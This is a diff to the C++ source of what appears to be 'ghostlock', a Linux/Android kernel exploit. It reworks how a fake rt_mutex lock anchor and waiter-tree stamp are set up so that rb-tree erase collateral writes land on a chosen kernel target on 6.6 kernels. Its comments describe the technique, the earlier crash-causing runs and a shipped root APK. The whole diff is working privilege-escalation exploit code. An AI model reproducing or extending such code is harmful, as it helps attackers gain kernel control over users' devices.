@@ -424,6 +424,61 @@ namespace ghostlock::route {
         bool stamped = true;
         bool anchor_ok = true;
 
+        /* The `lock` word decides where the walk's rt_mutex tree lives, for
+         * both waiter shapes -- the anchor is not a compact-only object. The
+         * default is the fake rt_mutex in the reclaimed payload page (the
+         * behaviour every build before this one had). With
+         * route.select_stack.lock_anchor_image set, point it at an
+         * image-relative zero, writable, reference-free region instead, so
+         * rt_mutex_enqueue's descent exits on its first test whatever that
+         * page happens to contain. data_alias() maps the image offset to the
+         * direct-map alias the walk dereferences -- the same conversion the
+         * working W1 write already depends on. The resolved address is printed
+         * so the host can probe exactly what the walk used.
+         * See docs/analysis/{payload-page-option2,select-noncompact-anchor}-plan.md. */
+        uint64_t lock_word = session::g_exploit_session.heap.current.fake_lock;
+        if (const auto anchor_image = context->layout.lock_anchor_image) {
+            /* Rotate the anchor per attempt. This lock object is NOT private
+             * to us: the kernel enqueues waiters into it (rb_add_cached sets
+             * lock->waiters.rb_leftmost), and those waiters live in a pselect
+             * stack frame that dies with the attempt. Sharing one anchor
+             * across attempts therefore leaves each attempt tripping over the
+             * previous one's dead waiter -- run 4 followed rb_leftmost into an
+             * unmapped stack page and oopsed at rt_mutex_adjust_prio_chain
+             * +0x3f0. The allocator (route/lock_anchor.cpp) keeps that serial
+             * monotonic across *processes* too, and refuses once the boot's
+             * slots are spent. A 0 return means: fail the route, never walk a
+             * neighbour slot.
+             * See docs/analysis/{stale-waiter-lifetime,anchor-slot-persistence}-plan.md. */
+            uintptr_t slot = 0;
+            const uintptr_t anchored = anchor::acquire_lock_word(
+                *anchor_image, context->layout.lock_anchor_bytes,
+                context->layout.lock_anchor_stride, attempt, &slot);
+            if (anchored == 0) {
+                anchor_ok = false;
+            } else {
+                lock_word = anchored;
+            }
+        }
+
+        /* The tree entry is the write vehicle, and its stamp comes from the
+         * same helper the compact encoder uses so the two cannot drift:
+         *   pointer layouts -> {pc = value, right = 0, left = target}: the
+         *     erase stores pc at rb_left and re-parents through pc & ~3, so
+         *     the collateral lands in that pointer's child slot.
+         *   leaf/zero       -> {pc = target - 8, right = 0, left = 0}: the node
+         *     is childless, nothing is stored on it, and the erase's collateral
+         *     writes NULL at *(target). A parentless pc here would instead
+         *     plant the target in the lock's tree root, which the walk's
+         *     dequeue -> enqueue then descends through as if it were a node
+         *     (runs Q1/Q2, rt_mutex_adjust_prio_chain+0x548).
+         * See waiter_tree_stamp() in memory/payload_builder.h. */
+        const memory::PayloadWriteLayout stamp_layout = {
+            .parent = (session::g_exploit_session.heap.current.fake_parent),
+            .right = (session::g_exploit_session.heap.current.fake_right),
+            .left = (session::g_exploit_session.heap.current.fake_left),
+        };
+
         if (compact) {
             /* Tree entry = all-zero PARKING node, and that zero pc is load-bearing:
              * it makes rt_mutex_dequeue()'s erase __rb_erase_augmented's case 1 with
@@ -458,63 +513,6 @@ namespace ghostlock::route {
              * reaching W2 attempt 1). Word->value mapping transcribed from the
              * session record and verified against the shipped
              * GhostLock-K-rootnull.apk binary. */
-            /* The `lock` word decides where the walk's rt_mutex tree lives.
-             * Default: the fake rt_mutex in the reclaimed payload page (the
-             * behaviour every previous build had). With
-             * route.select_stack.lock_anchor_image set, point it at an
-             * image-relative zero, writable, reference-free region instead, so
-             * rt_mutex_enqueue's descent exits on its first test whatever that
-             * page happens to contain. data_alias() maps the image offset to the
-             * direct-map alias the walk dereferences -- the same conversion the
-             * working W1 write already depends on. The resolved address is
-             * printed so the host can probe exactly what the walk used.
-             * See docs/analysis/payload-page-option2-plan.md. */
-            uint64_t lock_word = session::g_exploit_session.heap.current.fake_lock;
-            if (const auto anchor_image = context->layout.lock_anchor_image) {
-                /* Rotate the anchor per attempt. This lock object is NOT private
-                 * to us: the kernel enqueues waiters into it (rb_add_cached sets
-                 * lock->waiters.rb_leftmost), and those waiters live in a pselect
-                 * stack frame that dies with the attempt. Sharing one anchor
-                 * across attempts therefore leaves each attempt tripping over the
-                 * previous one's dead waiter -- run 4 followed rb_leftmost into an
-                 * unmapped stack page and oopsed at rt_mutex_adjust_prio_chain
-                 * +0x3f0. The allocator (route/lock_anchor.cpp) keeps that serial
-                 * monotonic across *processes* too, and refuses once the boot's
-                 * slots are spent; see the measurement in its comment.
-                 * See docs/analysis/{stale-waiter-lifetime,anchor-slot-persistence}-plan.md. */
-                /* The grid, the slot serial and the address conversion live in
-                 * route/lock_anchor.cpp -- one implementation for every
-                 * stack-stamp route, because the anchor region is shared kernel
-                 * state. A 0 return means: fail the route, never walk a
-                 * neighbour slot. */
-                uintptr_t slot = 0;
-                const uintptr_t anchored = anchor::acquire_lock_word(
-                    *anchor_image, context->layout.lock_anchor_bytes,
-                    context->layout.lock_anchor_stride, attempt, &slot);
-                if (anchored == 0) {
-                    anchor_ok = false;
-                } else {
-                    lock_word = anchored;
-                }
-            }
-
-            /* The tree entry is the write vehicle, and its stamp comes from the
-             * same helper the compact encoder uses so the two cannot drift:
-             *   pointer layouts -> {pc = value, right = 0, left = target}: the
-             *     erase stores pc at rb_left and re-parents through pc & ~3, so
-             *     the collateral lands in that pointer's child slot.
-             *   leaf/zero       -> {pc = target - 8, right = 0, left = 0}: the node
-             *     is childless, nothing is stored on it, and the erase's collateral
-             *     writes NULL at *(target). A parentless pc here would instead
-             *     plant the target in the lock's tree root, which the walk's
-             *     dequeue -> enqueue then descends through as if it were a node
-             *     (runs Q1/Q2, rt_mutex_adjust_prio_chain+0x548).
-             * See waiter_tree_stamp() in memory/payload_builder.h. */
-            const memory::PayloadWriteLayout stamp_layout = {
-                .parent = (session::g_exploit_session.heap.current.fake_parent),
-                .right = (session::g_exploit_session.heap.current.fake_right),
-                .left = (session::g_exploit_session.heap.current.fake_left),
-            };
             const memory::WaiterTreeStamp stamp =
                     memory::waiter_tree_stamp(stamp_layout);
             pr_info("[route] tree stamp pc=0x%llx right=0x%llx left=0x%llx target=0x%llx\n",
@@ -564,11 +562,31 @@ namespace ghostlock::route {
                            "rt_mutex_adjust_prio_chain+0x188\n");
             }
         } else {
-            /* 6.6 rt_mutex_waiter with rb_node tree/pi_tree */
+            /* 6.6 rt_mutex_waiter: rt_waiter_node tree/pi_tree. Without an
+             * anchor the page path's shape is unchanged -- the tree words stay
+             * zero and the page's crafted pi node is the write vehicle. With an
+             * anchor there is no page waiter in the walk's tree, so the stack
+             * waiter's own tree entry takes the stamp (the compact branch's
+             * vehicle; the rb_node's three words sit at offset 0 on every
+             * family) and `lock` moves to the anchor slot. The tree/pi
+             * prio/deadline words are not load-bearing here: 6.6+ rewrites them
+             * from the task on enqueue (waiter_update_prio()). */
+            const bool anchor_present =
+                    context->layout.lock_anchor_image.has_value();
+            const memory::WaiterTreeStamp tree_stamp =
+                    anchor_present ? memory::waiter_tree_stamp(stamp_layout)
+                                   : memory::WaiterTreeStamp{};
+            if (anchor_present) {
+                pr_info("[route] tree stamp pc=0x%llx right=0x%llx left=0x%llx target=0x%llx\n",
+                        static_cast<unsigned long long>(tree_stamp.pc),
+                        static_cast<unsigned long long>(tree_stamp.right),
+                        static_cast<unsigned long long>(tree_stamp.left),
+                        static_cast<unsigned long long>(request->target));
+            }
             struct pselect_waiter_word words[] = {
-                {2, 0, "tree_pc"},
-                {3, 0, "tree_right"},
-                {4, 0, "tree_left"},
+                {2, tree_stamp.pc, "tree_pc"},
+                {3, tree_stamp.right, "tree_right"},
+                {4, tree_stamp.left, "tree_left"},
                 {5, 1, "tree_prio"},
                 {6, 0, "tree_deadline"},
                 {7, 0, "pi_parent"},
@@ -577,7 +595,7 @@ namespace ghostlock::route {
                 {10, 1, "pi_prio"},
                 {11, 0, "pi_deadline"},
                 {12, ghostlock::profile::slide_init_task(), "task"},
-                {13, (session::g_exploit_session.heap.current.fake_lock), "lock"},
+                {13, lock_word, "lock"},
                 {14, 3, "wake_state"},
             };
             for (size_t i = 0; i < std::size(words); i++) {
